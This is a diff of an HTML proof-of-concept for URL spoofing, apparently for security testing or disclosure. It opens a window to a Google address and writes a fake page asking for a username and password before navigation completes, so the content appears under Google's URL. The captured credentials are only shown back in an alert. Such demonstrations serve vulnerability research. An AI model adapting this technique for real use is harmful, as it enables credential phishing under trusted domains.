@@ -1,23 +1,31 @@
+
 <!DOCTYPE html>
 <html>
-<body>
-<button onclick="testRedirect()">Clickk  tto spoof</button>
-<script>
-function testRedirect() {
-    let win = window.open("_blank", "https://www.google.com/csi");
-    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
-        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
-        '<h1>This is NOT Google!</h1>' +
-        '<p>Please enter your credentials:</p>' +
-        '<input>email</input>' +
-        '<input>password</input>' +
-        '</div>';
-    win.document.write(payload);
-    win.document.close();
-    setInterval(function() {
-        win.location.replace("https://www.google.com:8080");
-    }, 50);  // Small interval to preserve the spoof
-}
-</script>
-</body>
+  <body>
+    <button onclick="spoof()">Click to SPOOF</button>
+
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com:8080", "_blank");
+
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
 </html>
